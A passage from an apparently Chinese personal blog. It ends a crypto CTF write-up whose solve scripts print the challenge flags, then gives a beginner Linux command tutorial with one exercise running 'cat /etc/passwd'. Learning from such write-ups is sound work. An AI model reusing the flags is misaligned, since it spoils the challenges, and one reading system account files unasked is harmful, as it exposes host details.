class="number">493275281479560936332761096886786925792234184811353209227551802099268192839677496844153534128991899414803550843408607188612593757622064753867565869035222715177143938385039508273050267347710495512806264863554858016145161165422812554800693811328453743229819656381224407015421235005940088439590887928051969351426291843586132741521121351667152673680122929827805479163871436776753859965413192837591532468372</span></span><br><span class="line">leak=<span class="number">238829196127128263156194898141748280130190920343265228257398802867203846004703877952990524473329125233083096275276064071930416561616135910190674099345267027039386328203653489152769309498199556401574021633071022874689081585677578010276529507102304828451681000682208089162940529052283763507244593173690786957816545746540436261888398732172965945762569416702401859253725696471593023885944262561159982327952</span></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(KB))</span><br><span class="line">f = <span class="number">2023</span>*m - <span class="number">2022</span> + A</span><br><span class="line">f=f.monic()</span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">m=root[<span class="number">0</span>]</span><br><span class="line">B=gcd(KB, <span class="number">2023</span>*m - <span class="number">2022</span> + A)</span><br><span class="line">flag1=libnum.n2s(<span class="built_in">int</span>(root[<span class="number">0</span>]))</span><br><span class="line">flag2=libnum.n2s(<span class="built_in">int</span>(B))</span><br><span class="line"><span class="built_in">print</span>(flag1+flag2)</span><br><span class="line"><span class="comment">#ctfshow&#123;UNKNOWN_MODULUS_T0_BR1NG_L3UGHTER_AND_J@Y_TO_TH3_W0RLD&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="大牛的密码"><a href="#大牛的密码" class="headerlink" title="大牛的密码"></a>大牛的密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">S_BOX=[<span class="number">9</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">38</span>, <span class="number">20</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">46</span>, <span class="number">23</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">47</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">39</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">14</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">42</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">25</span>, <span class="number">35</span>, <span class="number">13</span>]</span><br><span class="line">c =   [<span class="number">99</span>, <span class="number">111</span>, <span class="number">102</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">11</span>, <span class="number">95</span>, <span class="number">112</span>, <span class="number">95</span>, <span class="number">109</span>, <span class="number">115</span>, <span class="number">11</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">119</span>, <span class="number">117</span>, <span class="number">79</span>, <span class="number">123</span>, <span class="number">111</span>, <span class="number">48</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">125</span>, <span class="number">116</span>, <span class="number">11</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">97</span>, <span class="number">67</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">110</span>, <span class="number">104</span>]</span><br><span class="line"></span><br><span class="line">INV_S_BOX=[(S_BOX.index(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(S_BOX))]</span><br><span class="line"><span class="built_in">print</span>(INV_S_BOX)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">m</span>):</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            m=[m[i] <span class="keyword">for</span> i <span class="keyword">in</span> INV_S_BOX]</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">m=decrypt1(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"><span class="comment">#ctfshow&#123;y0u_c5n_make_y0u1_own_CryptO&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="mini-ecc"><a href="#mini-ecc" class="headerlink" title="mini_ecc"></a>mini_ecc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">71397796933602469825964946338224836258949974632540581233301840806613437378503</span></span><br><span class="line">a = <span class="number">106105288190268015217241182934677375171023341761047638573248022053052499733117</span></span><br><span class="line">b = <span class="number">76170541771321874396004434442157725545076211607587599314450304327736999807927</span></span><br><span class="line">k = <span class="number">58155941823118858940343657716409231510854647214870891375273032214774400828217</span></span><br><span class="line">w2 = <span class="number">16315249811700998894876359855091105114973337718373913477026230968747515636405</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">Y = E([<span class="number">33237936857741483513705672980652927705102229733798436323453609986072499230366</span>,<span class="number">52619411226266177137991318059937693955038910547834999771526408984808553907338</span>])</span><br><span class="line">c1 = E([<span class="number">37414446283406201193977113266234367761786780230360175925999700345196415953455</span> , <span class="number">17037724145039910971426670298726906655653040365428438334942732090559637519851</span>])</span><br><span class="line">c2 = E([<span class="number">60560423732267272277570046154733119097475794979191838027420415113112056962844</span> ,<span class="number">54372226143125971429691267751299496959531971082475860532181772357190222938465</span>])</span><br><span class="line">d=inverse_mod(<span class="number">7</span>,E.order())</span><br><span class="line">X=Y*d</span><br><span class="line">flag1=<span class="built_in">int</span>(X[<span class="number">0</span>]+<span class="number">4585</span>)</span><br><span class="line">m=c1 - (c2 * k)</span><br><span class="line">flag2=w2//m[<span class="number">0</span>]</span><br><span class="line">flag=<span class="built_in">str</span>(flag1)+<span class="built_in">str</span>(flag2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment">#ctfshow&#123;the_answer_is_it&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c1 = <span class="number">151198307301713399973545627808177783191262282577048906899567665485020342464366268384613589477129150406859219553325982275344405383612415523342568367197935454935162234419239807109194526080836070453102172720442102673200212658553214847476648456720629906051324248179394810385918370092764118401652990951968387233220</span></span><br><span class="line">c2 = <span class="number">7894512574379281106340582833782408137686355961537832816105517328532111343730615739255485918919146012721446905489729048235088965936700563973759759039693443386542070451737445467143517377017890468837697907596398070608179281207203217576205857817411996178441661371846647602166663752324880657668362355493701482869858528298247422875427747085642627978367348931707497113936723122393282697211257939351221141536029828744507560524637999804394951722319070365576391442828074457050403771353328835153787572457070779602728359333021922987279454923820866436212282592764768470608545881718922440010751845730974331917142224339664090863915</span></span><br><span class="line">n = <span class="number">20873587976264698212013861921447267548758723109929620330136081844796427967720295581580927324390713931549639540337285515365487607593546367886570408812338077846317206794057714877394609181224434104303259411081376607299962306250984285173463537669954845497211859940191392861121877814873939865829555350848523691546006073264112091406848179785659505299775196062799482197712761744192962658799557108701192680225134300686608396391566674966897700511638643429161735764600752699251493599533703928135311599575989253347234975026924804433742500175666009324057320386262109587593814197687132304704244158862263859846356497849518103755981</span></span><br><span class="line"></span><br><span class="line">pbits=<span class="number">256</span></span><br><span class="line">c3=(c1&gt;&gt;pbits)&lt;&lt;pbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=c3+x</span><br><span class="line"><span class="comment"># f=f.monic()</span></span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^pbits,beta=<span class="number">0.4</span>)</span><br><span class="line">p=c3+root[<span class="number">0</span>]</span><br><span class="line">m=c1.__xor__(<span class="built_in">int</span>(p))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># ctfshow&#123;m_xor_p_but_coppersmith&#125;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" rel="tag">2023ctfshow愚人杯</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-Linux基础"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/"
    >Linux基础</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2023-03-22T13:48:28.000Z" itemprop="datePublished">2023-03-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a> / <a class="article-category-link" href="/categories/Linux/Linux%E5%9F%BA%E7%A1%80/">Linux基础</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Linux命令初体验"><a href="#Linux命令初体验" class="headerlink" title="Linux命令初体验"></a>Linux命令初体验</h1><h2 id="Linux命令终端介绍"><a href="#Linux命令终端介绍" class="headerlink" title="Linux命令终端介绍"></a>Linux命令终端介绍</h2><p>退出命令终端输入exit或者ctrl+d快捷方式退出命令终端</p>
<h3 id="设置命令终端窗口字体大小"><a href="#设置命令终端窗口字体大小" class="headerlink" title="设置命令终端窗口字体大小"></a>设置命令终端窗口字体大小</h3><p>设置命令终端窗口字体大小： </p>
<p>临时设置字体大小 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl + - :缩小字体 </span><br><span class="line">ctrl + shift + + :增大字体 </span><br></pre></td></tr></table></figure>

<p>持久设置字体大小 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在命令终端界面点击右键--&gt;配置文件首选项--&gt;文本--&gt;自定义字体</span><br></pre></td></tr></table></figure>

<h3 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h3><p>(root㉿kali)-[&#x2F;opt]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:用户名</span><br><span class="line">kali:表示主机名</span><br><span class="line">opt ：表示当前目录名</span><br></pre></td></tr></table></figure>

<h2 id="Linux命令体验"><a href="#Linux命令体验" class="headerlink" title="Linux命令体验"></a>Linux命令体验</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">who ：显示当前登录用户</span><br><span class="line">pwd（<span class="built_in">print</span> work directory）：显示当前目录</span><br><span class="line">cd (change directory): 切换目录</span><br><span class="line">cd ~ : 切换到用户工作目录</span><br><span class="line">tree :查看文件列表</span><br><span class="line">ls ：查看文件列表</span><br><span class="line">	ls -l</span><br><span class="line">ifconfig（interface config）查看网卡配置信息</span><br><span class="line">linux查看ip ： ifconfig</span><br><span class="line">window查看ip： ipconfig</span><br><span class="line">ip地址有ipv4和ipv6两个版本， 目前主要使用ipv4</span><br><span class="line">ping ：测试主机间的连接情况</span><br><span class="line">主机可以用ip地址或者域名来描述</span><br><span class="line"> 比如: ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.6</span></span><br><span class="line">       ping www.baidu.com</span><br><span class="line">clear： 清除命令终端内容</span><br><span class="line">ctrl+L :快捷方式清除命令终端内容</span><br><span class="line">uname ：显示操作系统信息 </span><br><span class="line">	uname -r</span><br><span class="line">    uname -a</span><br><span class="line">uname -r ：查看linux内核版本发行号 </span><br><span class="line">exit： 退出或注销用户</span><br><span class="line"></span><br><span class="line">shutdown ：关闭系统</span><br><span class="line">	shutdown –r now :重启系统</span><br><span class="line">	shutdown –h now :关机</span><br><span class="line">	shutdown –h +<span class="number">5</span> :<span class="number">5</span>分钟之后关机</span><br><span class="line">	shutdown –c :取消预定的关机</span><br></pre></td></tr></table></figure>

<h2 id="Linux命令格式"><a href="#Linux命令格式" class="headerlink" title="Linux命令格式"></a>Linux命令格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">command[-options][parameter]</span><br><span class="line"></span><br><span class="line">command:命令名，比如：who,pwd</span><br><span class="line">[-options]:选项，可以有零个、一个或者多个选项，多个选项可以合并，比如使用的 -r 就是选项</span><br><span class="line">[parameter]:参数，可以有零个、一个或者多个参数，比如：ping 192.168.1.6， cd ~  这些都是参数</span><br><span class="line">[]代表可选</span><br></pre></td></tr></table></figure>



<h2 id="使用Linux命令的小技巧"><a href="#使用Linux命令的小技巧" class="headerlink" title="使用Linux命令的小技巧"></a>使用Linux命令的小技巧</h2><h3 id="命令补全"><a href="#命令补全" class="headerlink" title="命令补全"></a>命令补全</h3><p>当输入的字符足以确定某个命令或者某个文件时，只需按Tab键就可以自动补全该命令或者剩下的命令</p>
<h3 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h3><p>使用上下箭头查看已经使用过的历史命令</p>
<p>使用history命令查看已经使用过的命令</p>
<p>​		！+序列号可以执行对应的命令   注意！和序列号之间没有空格</p>
<h3 id="终止命令的执行"><a href="#终止命令的执行" class="headerlink" title="终止命令的执行"></a>终止命令的执行</h3><p>ctrl+c：终止命令的执行</p>
<p>测试top命令查看系统执行效果:[lijun@192~]$top</p>
<h3 id="查看命令帮助方式"><a href="#查看命令帮助方式" class="headerlink" title="查看命令帮助方式"></a>查看命令帮助方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--<span class="built_in">help</span></span><br><span class="line">   eg:uname --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">man命令</span><br><span class="line">man命令是manual的简写，表示查看指定命令的使用说明书</span><br><span class="line">使用格式：man命令名</span><br><span class="line">例如：</span><br><span class="line">man uname</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>操作键</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>空格</td>
<td>显示下一屏的信息</td>
</tr>
<tr>
<td>回车</td>
<td>显示下一行信息</td>
</tr>
<tr>
<td>q</td>
<td>退出</td>
</tr>
</tbody></table>
<h1 id="Linux常用命令1"><a href="#Linux常用命令1" class="headerlink" title="Linux常用命令1"></a>Linux常用命令1</h1><h3 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h3><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321223051622.png" alt="image-20230321223051622"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">主要目录说明:</span><br><span class="line">/：Linux文件系统根目录，所有文件都是在该目录下面</span><br><span class="line">/boot</span><br><span class="line">	启动Linux时使用的一些核心文件</span><br><span class="line">/root</span><br><span class="line">	该目录为系统管理员（超级用户root）的主目录。</span><br><span class="line">/<span class="built_in">bin</span></span><br><span class="line">	binary的缩写，用来存放用户命令文件。</span><br><span class="line">/sbin</span><br><span class="line">	s就是Super User的意思。这里存放的是系统管理员使用的系统管理命令文件。</span><br><span class="line">/etc/</span><br><span class="line">	存放系统管理所需要的配置文件。</span><br><span class="line">/dev/</span><br><span class="line">	dev是Device(设备)的缩写。该目录下存放的是设备文件，在</span><br><span class="line">Linux中访问外部设备的方式和访问文件的方式是相同的。</span><br><span class="line"></span><br><span class="line">/home</span><br><span class="line">	用以存放普通用户的主目录。在Linux中，每个用户都有一个自己的目录，一般以用户的账号命名</span><br><span class="line">/home/用户名</span><br><span class="line">	某普通用户的主目录，假如用户名是pz，则/home/pz则为该用户的主目录，可简写为~</span><br><span class="line">/opt</span><br><span class="line">	可选文件和程序的存储目录。该目录主要被第三方开发者用来简易地安装和卸装他们的软件包。</span><br><span class="line">/mnt</span><br><span class="line">	该目录中通常包括系统引导后被挂载的文件系统的挂载点。</span><br><span class="line">/usr/ ...包括与系统用户直接有关的文件和目录</span><br><span class="line"> /usr/X11R6：X Window的目录；</span><br><span class="line">/usr/<span class="built_in">bin</span>：存放着许多应用程序；</span><br><span class="line">/usr/sbin：存放root超级用户使用的管理程序；</span><br><span class="line">/usr/lib：存放一些常用的动态链接共享库和静态档案库；</span><br><span class="line">/usr/src：存放源代码，Linux源代码就存在这个目录中。</span><br><span class="line">/usr/local：这是提供给一般用户的</span><br><span class="line">/usr目录，在这里安装一般的应用软件；</span><br></pre></td></tr></table></figure>

<h3 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h3><h4 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h4><p>绝对路径：是指从根目录&#x2F;开始的路径</p>
<p>相对路径：是指从当前目录开始的路径</p>
<h4 id="使用cd命令切换目录"><a href="#使用cd命令切换目录" class="headerlink" title="使用cd命令切换目录"></a>使用cd命令切换目录</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>使用cd命令切换目录</td>
<td>切换到指定目录</td>
</tr>
<tr>
<td>cd ~ (波浪线)</td>
<td>切换到当前用户的主目录</td>
</tr>
<tr>
<td>cd ..</td>
<td>切换到上一级目录</td>
</tr>
<tr>
<td>cd .</td>
<td>切换到当前目录</td>
</tr>
<tr>
<td>cd -</td>
<td>切换到上一次目录</td>
</tr>
</tbody></table>
<h3 id="查看目录的文件列表信息"><a href="#查看目录的文件列表信息" class="headerlink" title="查看目录的文件列表信息"></a>查看目录的文件列表信息</h3><p>文件信息:</p>
<p>当创建一个文件的时候，系统保存了有关该文件的全部信息包括：文件的名称、文件的位置、文件类型、文件长度、文件的拥有者、i节点、文件的修改时间、文件的权限等</p>
<p>命令：ls</p>
<table>
<thead>
<tr>
<th>命令选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>以列表方式显示use a long listing format</td>
</tr>
<tr>
<td>-h</td>
<td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td>
</tr>
<tr>
<td>-a</td>
<td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td>
</tr>
</tbody></table>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224221903.png" alt="image-20230321224221903"></p>
<p>文件类型</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224302825.png" alt="image-20230321224302825"></p>
<p>文件权限</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224321300.png" alt="image-20230321224321300"></p>
<p>提示：</p>
<p>1.选项之间可以组合一起使用</p>
<p>2.-h选项一般结合-l一起使用</p>
<p>3.文件与目录名前添加   .  ，用于隐藏文件</p>
<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(当前目录是rh用户的主目录)</span><br><span class="line">1.以相对路径与绝对路径切换(cd)到用户主目录( /home/rh)</span><br><span class="line">cd /home/rh</span><br><span class="line">2.以相对路径与绝对路径切换(cd)到根目录下的opt子目录(/opt)</span><br><span class="line">cd ../../opt</span><br><span class="line">cd /opt</span><br><span class="line">3.使用ls -l命令查看用户主目录的内容</span><br><span class="line">ls -l /home/rh</span><br><span class="line">ls -l ~</span><br></pre></td></tr></table></figure>

<h3 id="创建、删除文件及目录命令"><a href="#创建、删除文件及目录命令" class="headerlink" title="创建、删除文件及目录命令"></a>创建、删除文件及目录命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch  文件路径/文件名:创建指定文件</span><br><span class="line">mkdir   目录名:创建目录(文件夹)</span><br><span class="line">	选项：p级联创建目录</span><br><span class="line">rm     文件\文件夹:删除指定文件</span><br><span class="line">  选项：r：递归删除目录及其内容</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前目录是kali用户主目录</span><br><span class="line"><span class="number">1.</span>在当前目录创建info.txt文件</span><br><span class="line">	touch info.txt</span><br><span class="line"><span class="number">2.</span>在当前目录创建CTF文件夹</span><br><span class="line">	mkdir CTF</span><br><span class="line"><span class="number">3.</span>在CTF文件夹下创建a.txt文件</span><br><span class="line">	touch ./CTF/a.txt</span><br><span class="line"><span class="number">4.</span>删除用户主目录info.txt文件</span><br><span class="line">	rm ~/info.txt</span><br><span class="line"><span class="number">5.</span>删除CTF文件夹</span><br><span class="line">	rm -r ~/CTF</span><br></pre></td></tr></table></figure>

<h3 id="复制、移动文件及目录命令"><a href="#复制、移动文件及目录命令" class="headerlink" title="复制、移动文件及目录命令"></a>复制、移动文件及目录命令</h3><p>cp : 拷贝文件、拷贝目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拷贝文件</span></span><br><span class="line">cp  源文件 目标路径/目标文件名</span><br><span class="line">	<span class="number">1.</span>如果不指定目标文件名，使用源文件名</span><br><span class="line">	<span class="number">2.</span>如果目标文件存在，覆盖原来文件</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">拷贝目录</span><br><span class="line">cp -r 源目录 目标目录</span><br></pre></td></tr></table></figure>

<p>mv:移动文件、移动目录、重命名，move</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#移动文件</span></span><br><span class="line">mv 源文件 目标路径/目标文件名</span><br><span class="line">	<span class="number">1.</span>如果不指定目标文件名，使用源文件名</span><br><span class="line">	<span class="number">2.</span>如果目标文件存在，覆盖原来文件</span><br><span class="line"><span class="comment">#移动目录</span></span><br><span class="line">mv 源目录 目标目录</span><br><span class="line"><span class="comment">#重命名：</span></span><br><span class="line">mv 源文件名 目标文件名(在同一级目录下)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当前目录为用户主目录</span><br><span class="line">1.在当前目录创建info.txt文件</span><br><span class="line">	touch info.txt</span><br><span class="line">2.在当前目录创建CTF文件夹</span><br><span class="line">	mkdir CTF</span><br><span class="line">3.在CTF文件夹下创建a.txt文件</span><br><span class="line">	touch ./CTF/a.txt</span><br><span class="line">4.拷贝info.txt到CTF目录下</span><br><span class="line">	cp info.txt ./CTF</span><br><span class="line">5.对a.txt文件移动到用户主目录下，且重命名为b.txt</span><br><span class="line">	mv CTF/a.txt /home/kali/b.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="重定向与管道命令"><a href="#重定向与管道命令" class="headerlink" title="重定向与管道命令"></a>重定向与管道命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">重定向</span><br><span class="line">把原本输出到屏幕上的内容，输出到文件中(文件不存在，则新建)，这就是重定向重定向命令：</span><br><span class="line">&gt;:覆盖模式重定向、</span><br><span class="line">&gt;&gt;:追加模式重定向</span><br><span class="line">管道命令</span><br><span class="line">|：管道的功能是将前一个程序的输出作为后一个程序的输入</span><br><span class="line">wc：word count：单词统计</span><br></pre></td></tr></table></figure>

<h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat:查看文件内容</span><br><span class="line">more：分屏查看文件内容，按空格切换到下一屏</span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>把历史命令history输出的内容写入到用户主目录的myfile.txt文件中</span><br><span class="line">history &gt; myfile.txt</span><br><span class="line"><span class="number">2.</span>把/根目录下的文件列表追加到用户主目录的myfile.txt文件中</span><br><span class="line">ls / &gt;&gt; myfile.txt</span><br><span class="line"><span class="number">3.</span>用ls显示/目录的目录和文件，并且分屏显示</span><br><span class="line">ls / | more</span><br><span class="line">ls / | wc</span><br><span class="line"><span class="number">4.</span>分别用cat和more命令查看 /etc/passwd的内容</span><br><span class="line">cat /etc/passwd</span><br><span class="line">more /etc/passwd</span><br></pre></td></tr></table></figure>

